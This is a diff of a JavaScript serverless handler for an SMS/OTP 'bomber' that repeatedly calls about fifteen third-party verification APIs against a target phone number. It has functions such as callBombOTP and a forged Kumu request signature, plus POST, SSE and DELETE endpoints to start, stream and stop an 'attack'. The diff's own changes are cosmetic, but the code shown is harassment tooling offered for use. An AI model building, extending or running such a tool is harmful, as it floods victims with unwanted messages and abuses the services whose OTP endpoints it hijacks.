@@ -2,7 +2,7 @@ import { randomBytes, createHash, randomUUID } from 'crypto';
 
 // Rate limiting (anti‑DDOS)
 const requestLog = new Map();
-const RATE_LIMIT = 10; // max requests per minute per IP
+const RATE_LIMIT = 10;
 const RATE_WINDOW = 60000;
 
 function isRateLimited(ip) {
@@ -15,7 +15,7 @@ function isRateLimited(ip) {
   return false;
 }
 
-// Helper functions (identical to Python)
+// Helper functions (exact Python logic)
 function formatPhone(phone) {
   let cleaned = phone.toString().replace(/[\s\-+]/g, '');
   if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
@@ -37,7 +37,7 @@ function generateKumuSignature(ts, rnd, phone) {
   return createHash('sha256').update(data).digest('hex');
 }
 
-// ========== 15 API SERVICES (exact headers & logic from Python) ==========
+// ---------- 15 SERVICES (exact from Python) ----------
 async function callBombOTP(phone) {
   const formatted = formatPhone(phone);
   const headers = {
@@ -319,18 +319,16 @@ async function callCashalo(phone) {
   } catch (e) { return { success: false, message: e.message }; }
 }
 
-// ========== Attack state & SSE ==========
+// ---------- Attack state & SSE ----------
 let activeAttack = null;
 let attackClients = new Set();
 
 export default async function handler(req, res) {
-  // Rate limiting (anti‑DDOS)
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
   if (isRateLimited(ip)) {
     return res.status(429).json({ error: "Nice try kid! Slow down." });
   }
 
-  // POST – start attack
   if (req.method === 'POST') {
     const { phone, batches } = req.body;
     if (!phone || !batches) return res.status(400).json({ error: 'Missing parameters' });
@@ -354,7 +352,6 @@ export default async function handler(req, res) {
     return res.json({ success: true });
   }
 
-  // GET – Server‑Sent Events
   if (req.method === 'GET') {
     res.setHeader('Content-Type', 'text/event-stream');
     res.setHeader('Cache-Control', 'no-cache');
@@ -364,7 +361,6 @@ export default async function handler(req, res) {
     return;
   }
 
-  // DELETE – stop attack
   if (req.method === 'DELETE') {
     if (activeAttack) activeAttack.cancelled = true;
     return res.json({ stopped: true });
